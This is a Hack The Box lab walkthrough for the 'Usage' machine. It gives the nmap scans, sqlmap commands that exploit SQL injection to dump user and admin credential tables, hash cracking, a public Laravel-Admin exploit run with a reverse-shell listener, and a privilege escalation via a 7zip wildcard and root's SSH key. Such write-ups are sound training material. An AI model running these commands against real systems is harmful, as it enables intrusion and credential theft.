![](images/image0.png)

# Usage HTB Walkthrough

---

## Enumeration

```bash
nmap -p- -Pn 10.129.56.30 -v -T5 --min-rate 1000 --max-rtt-timeout 1000ms --max-retries 5 -oN nmap_ports.txt && sleep 5 && nmap -Pn 10.129.56.30 -sC -sV -v -oN nmap_sVsC.txt && sleep 5 && nmap -T5 -Pn 10.129.56.30 -v --script vuln -oN nmap_vuln.txt
```

![](images/image1.png)

On port 80 we see this website; the **Admin** option looks interesting.

![](images/image2.png)

When we go there, it shows another login form.

![](images/image25.png)

By checking the source code, we see that it is a **Laravel-Admin/AdminLTE** app.

![](images/image7.png)

---

## Testing Inputs and Vulnerability Discovery

Captured requests in **Burp Suite**, entered `'` into the form fields — resulted in **HTTP 500** for the password reset endpoint.

![](images/image18.png)

The **email** parameter was vulnerable.

![](images/image13.png)

---

## SQL Injection Exploitation

Saved Burp request and executed **sqlmap**:

```bash
sqlmap -r request2 --batch --level 5 --risk 3 --threads 10 -p email --dbs
```

![](images/image9.png)

Then enumerated tables in the `usage_blog` database:

```bash
sqlmap -r request2 --batch --level 5 --risk 3 --threads 10 -p email --tables -D usage_blog
```

![](images/image23.png)

Dumped user credentials:

```bash
sqlmap -r request2 --batch --level 5 --risk 3 --threads 10 -p email --dump -T users -D usage_blog
```

![](images/image8.png)

Dumped `admin_users` table:

```bash
sqlmap -r request2 --batch --level 5 --risk 3 --threads 10 -p email --dump -T admin_users -D usage_blog
```

![](images/image15.png)

We obtained an **admin hash**. Cracked it using **John the Ripper**:

```bash
john --wordlist=rockyou.txt hash.txt
```

![](images/image21.png)

---

## Admin Panel Access and RCE Exploit

Logged in at `admin.usage.htb` using cracked admin credentials.

![](images/image24.png)

After research, identified **CVE-2023-24249**, a known Laravel Admin exploit.

Used exploit from [https://github.com/IDUZZEL/CVE-2023-24249-Exploit](https://github.com/IDUZZEL/CVE-2023-24249-Exploit):

```bash
python3 exploit.py -u http://admin.usage.htb -U admin -P whatever1 -i 10.10.15.30 -p 4444
```

![](images/image20.png)
![](images/image11.png)

User flag located in the home directory.

---

## Lateral Movement

During enumeration, found `.monitrc` file in `/home/dash/` containing credentials.

![](images/image4.png)

Used these credentials to switch to user **xander**:

![](images/image6.png)

---

## Privilege Escalation via 7zip Wildcard Exploit

As user **xander**, running `sudo -l` revealed permission to execute `usage_management` as root.

![](images/image16.png)

The tool has three options. Selecting the first creates a **7zip backup**.

![](images/image14.png)
![](images/image3.png)

Running `strings` on the binary shows the **7za** execution command.

![](images/image17.png)

Found **7zip wildcard exploitation** technique reference:  
[https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/wildcards-spare-tricks.html](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/wildcards-spare-tricks.html)

![](images/image22.png)
![](images/image10.png)

Exploited this to get root and read `root.txt`.

![](images/image19.png)

Alternatively, could copy `/root/.ssh/id_rsa` and connect as root:

```bash
ssh root@10.129.56.30 -i id_rsa
```

![](images/image12.png)
![](images/image5.png)

---

## Summary

- Identified SQLi in Laravel Admin login.  
- Dumped admin credentials and cracked password.  
- Exploited CVE-2023-24249 for shell access.  
- Found credentials in `.monitrc` for user escalation.  
- Used wildcard exploit in 7zip to gain root access.

---
